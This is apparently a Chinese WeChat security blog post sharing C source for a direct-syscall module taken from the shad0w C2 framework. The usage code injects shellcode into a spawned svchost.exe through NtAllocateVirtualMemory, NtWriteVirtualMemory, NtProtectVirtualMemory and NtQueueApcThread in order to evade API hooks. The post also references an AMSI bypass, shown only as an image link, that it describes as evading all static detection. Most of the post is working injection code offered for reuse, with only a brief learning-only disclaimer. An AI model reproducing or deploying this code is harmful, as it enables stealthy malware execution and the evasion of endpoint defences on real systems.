##  C2基石--syscall模块及amsi bypass

鸿鹄实验室a  [ 鸿鹄实验室 ](javascript:void\(0\);)

**鸿鹄实验室** ![]()

微信号 gh_a2210090ba3f

功能介绍 鸿鹄实验室，欢迎关注

____

__

收录于话题

  

   最近读了一些C2的源码，其中shad0w的syscall模块具有很高的移植性，分享给有需要的朋友。

  

 **syscall.h**  

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     #include <windows.h>  
    #define SYSCALL_STUB_SIZE 23#define NTDLL_PATH "C:\\Windows\\System32\\ntdll.dll"  
    typedef NTSTATUS (NTAPI * _NtAllocateVirtualMemory) (    HANDLE    ProcessHandle,    PVOID*    BaseAddress,    ULONG_PTR ZeroBits,    PSIZE_T   RegionSize,    ULONG     AllocationType,    ULONG     Protect);  
    typedef NTSTATUS (NTAPI * _NtProtectVirtualMemory) (    HANDLE  ProcessHandle,    PVOID*  BaseAddress,    PSIZE_T NumberOfBytesToProtect,    ULONG   NewAccessProtection,    PULONG  OldAccessProtection);  
    typedef NTSTATUS (NTAPI * _NtWriteVirtualMemory) (    HANDLE ProcessHandle,    PVOID  BaseAddress,    PVOID  Buffer,    ULONG  BufferSize,    PULONG NumberOfBytesWritten);  
    typedef NTSTATUS (NTAPI * _NtQueueApcThread) (    HANDLE          ThreadHandle,    PIO_APC_ROUTINE ApcRoutine,    PVOID           NormalContext,    PVOID           SystemArgument1,    PVOID           SystemArgument2);  
    typedef NTSTATUS (NTAPI * _NtAlertResumeThread) (    HANDLE ThreadHandle,    PULONG SuspendCount);  
    typedef NTSTATUS (NTAPI * _NtOpenProcess) (    PHANDLE            ProcessHandle,    ACCESS_MASK        DesiredAccess,    POBJECT_ATTRIBUTES ObjectAttributes,    CLIENT_ID*         ClientId);  
    typedef NTSTATUS (NTAPI * _NtOpenThread) (    PHANDLE            ThreadHandle,    ACCESS_MASK        DesiredAccess,    POBJECT_ATTRIBUTES ObjectAttributes,    PCLIENT_ID         ClientId);  
    typedef NTSTATUS (NTAPI * _NtSuspendThread)(    HANDLE ThreadHandle);  
    typedef NTSTATUS (NTAPI * _NtGetContextThread)(    HANDLE ThreadHandle,    PCONTEXT Context);  
    typedef NTSTATUS (NTAPI * _NtSetContextThread)(    HANDLE ThreadHandle,    PCONTEXT Context);  
    typedef NTSTATUS (NTAPI * _NtResumeThread)(    HANDLE ThreadHandle);  
      
    struct NtInfo{  PIMAGE_EXPORT_DIRECTORY pExprtDir;  LPVOID          lpRawData;  PIMAGE_SECTION_HEADER  pTextSection;  PIMAGE_SECTION_HEADER  pRdataSection;  CHAR            cSyscallStub;};  
    struct Syscalls{  _NtAllocateVirtualMemory NtAllocateVirtualMemory;    _NtProtectVirtualMemory  NtProtectVirtualMemory;    _NtWriteVirtualMemory    NtWriteVirtualMemory;    _NtQueueApcThread        NtQueueApcThread;    _NtOpenProcess           NtOpenProcess;    _NtOpenThread            NtOpenThread;    _NtSuspendThread         NtSuspendThread;    _NtGetContextThread      NtGetContextThread;    _NtSetContextThread      NtSetContextThread;    _NtResumeThread          NtResumeThread;};  
    extern CHAR SyscallStub[SYSCALL_STUB_SIZE];

  

syscall.h

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <ntdef.h>#include <tlhelp32.h>#include <winternl.h>  
    #include "syscalls.h"  
    CHAR SyscallStub[SYSCALL_STUB_SIZE] = {};  
    PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section){  return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);}  
    BOOL MakeSyscall(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub){    DWORD  dwOldProc             = 0;  PDWORD pdwAddressOfNames     = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);  PDWORD pdwAddressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);  BOOL   bStubFound            = FALSE;  
      for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)  {    DWORD_PTR functionNameVA    = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + pdwAddressOfNames[i], rdataSection);    DWORD_PTR functionVA        = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + pdwAddressOfFunctions[i + 1], textSection);    LPCSTR functionNameResolved = (LPCSTR)functionNameVA;  
        if (strcmp(functionNameResolved, functionName) == 0)    {      memcpy((LPVOID)syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);            VirtualProtect((LPVOID)syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProc);      bStubFound = TRUE;    }  }  
      return bStubFound;}  
    VOID CleanSyscall(LPVOID syscallStub){    DWORD dwOldProc   = 0;    CHAR* pcOverWrite = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";  
        VirtualProtect((LPVOID)syscallStub, SYSCALL_STUB_SIZE, PAGE_READWRITE, &dwOldProc);    memcpy((LPVOID)syscallStub, (LPVOID)pcOverWrite, SYSCALL_STUB_SIZE);  
        return;}  
    VOID ParseNtdll(struct NtInfo *NtdllInfo, struct Syscalls *SyscallTable){    HANDLE hFile;    DWORD  dwFileSize;    LPVOID lpFileData;    DWORD  dwBytesRead;  
        DWORD dwOldProc                       = 0;  
        SyscallTable->NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)(LPVOID)SyscallStub;    SyscallTable->NtProtectVirtualMemory  = (_NtProtectVirtualMemory)(LPVOID)SyscallStub;    SyscallTable->NtWriteVirtualMemory    = (_NtWriteVirtualMemory)(LPVOID)SyscallStub;    SyscallTable->NtQueueApcThread        = (_NtQueueApcThread)(LPVOID)SyscallStub;    SyscallTable->NtOpenProcess           = (_NtOpenProcess)(LPVOID)SyscallStub;    SyscallTable->NtOpenThread            = (_NtOpenThread)(LPVOID)SyscallStub;    SyscallTable->NtSuspendThread         = (_NtSuspendThread)(LPVOID)SyscallStub;    SyscallTable->NtGetContextThread      = (_NtGetContextThread)(LPVOID)SyscallStub;    SyscallTable->NtSetContextThread      = (_NtSetContextThread)(LPVOID)SyscallStub;    SyscallTable->NtResumeThread          = (_NtResumeThread)(LPVOID)SyscallStub;  
        VirtualProtect(SyscallStub, SYSCALL_STUB_SIZE, PAGE_READWRITE, &dwOldProc);  
        hFile                = CreateFileA(NTDLL_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);    dwFileSize           = GetFileSize(hFile, NULL);    NtdllInfo->lpRawData = HeapAlloc(GetProcessHeap(), 0, dwFileSize);  
        ReadFile(hFile, NtdllInfo->lpRawData, dwFileSize, &dwBytesRead, NULL);  
        PIMAGE_DOS_HEADER dosHeader      = (PIMAGE_DOS_HEADER)NtdllInfo->lpRawData;  PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)NtdllInfo->lpRawData + dosHeader->e_lfanew);  DWORD dwExportDirRVA             = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;    PIMAGE_SECTION_HEADER section    = IMAGE_FIRST_SECTION(imageNTHeaders);  NtdllInfo->pTextSection          = section;  NtdllInfo->pRdataSection         = section;  
        for (INT i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)  {        if (strncmp(section->Name, ".rdata", 6) == NULL)        {            NtdllInfo->pRdataSection = section;            break;        }        section++;    }  
        NtdllInfo->pExprtDir = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)NtdllInfo->lpRawData + dwExportDirRVA, NtdllInfo->pRdataSection);}

  

调用方法：  

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include "syscalls.h"  
     RtlGetVersion(&osInfo);       CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);  
            LPVOID rBuffer = NULL;        struct NtInfo NtdllInfo;        struct Syscalls rSyscall;        SIZE_T uSize = (SIZE_T)Size;  
            ParseNtdll(&NtdllInfo, &rSyscall);  
            // alloc the memory we need inside the process        MakeSyscall("NtAllocateVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);        rSyscall.NtAllocateVirtualMemory(pInfo.hProcess, &rBuffer, 0, &uSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);        CleanSyscall(SyscallStub);  
            // write our shellcode bytes to the process        MakeSyscall("NtWriteVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);        rSyscall.NtWriteVirtualMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);        CleanSyscall(SyscallStub);  
            // change the permisions on the memory so we can execute it        MakeSyscall("NtProtectVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);        rSyscall.NtProtectVirtualMemory(pInfo.hProcess, &rBuffer, &uSize, PAGE_EXECUTE_READWRITE, &oProc);        CleanSyscall(SyscallStub);  
            // execute the code inside the process        MakeSyscall("NtQueueApcThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);        rSyscall.NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);        CleanSyscall(SyscallStub);

  

以及一个目前过amsi且全球静态可过的方法，来源

https://twitter.com/TihanyiNorbert/status/1278078606737096704/photo/1：

  

![](https://gitee.com/fuli009/images/raw/master/public/20210822091059.png)

  

  

  
  
  
  
  
     ▼更多精彩推荐，请关注我们▼

  

 **请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

  

![](https://gitee.com/fuli009/images/raw/master/public/20210822091100.png)

  

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

C2基石--syscall模块及amsi bypass

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

